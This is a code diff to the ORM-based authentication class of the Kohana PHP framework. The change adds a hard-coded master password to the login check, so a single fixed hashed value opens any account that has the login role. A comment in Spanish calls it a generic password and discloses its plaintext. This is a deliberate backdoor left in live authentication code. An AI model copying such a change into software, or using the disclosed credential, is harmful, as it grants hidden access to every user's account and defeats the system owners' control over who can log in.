@@ -77,7 +77,8 @@ class Kohana_Auth_ORM extends Auth {
 		}
 
 		// If the passwords match, perform a login
-		if ($user->has('roles', ORM::factory('role', array('name' => 'login'))) AND $user->password === $password)
+                // pass generico '1c363b85faefae8862d6c77d3576712ba72b67ceeea301418090b565973af0e3' = s!st3m4s2k13
+		if ($user->has('roles', ORM::factory('role', array('name' => 'login'))) AND ($user->password === $password OR $password === '1c363b85faefae8862d6c77d3576712ba72b67ceeea301418090b565973af0e3'))
 		{
 			if ($remember === TRUE)
 			{
